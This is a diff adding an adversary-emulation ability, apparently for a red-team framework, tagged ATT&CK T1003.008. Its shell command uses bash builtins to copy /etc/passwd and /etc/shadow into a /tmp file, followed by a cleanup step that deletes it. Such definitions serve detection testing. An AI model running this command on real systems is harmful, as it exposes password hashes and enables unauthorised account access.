@@ -1,0 +1,16 @@
+- description: 'Dump /etc/passwd and /etc/shadow using bash builtins
+
+    '
+  id: 838fcd628b987b82c6dff35cd275f916
+  name: Access /etc/{shadow,passwd} with shell builtins
+  platforms:
+    linux:
+      sh:
+        cleanup: rm -f /tmp/T1003.008.txt
+        command: function testcat(){ echo "$(< $1)"; }; testcat /etc/passwd > /tmp/T1003.008.txt;
+          testcat /etc/shadow > /tmp/T1003.008.txt
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1003.008
+    name: 'OS Credential Dumping: /etc/passwd and /etc/shadow'
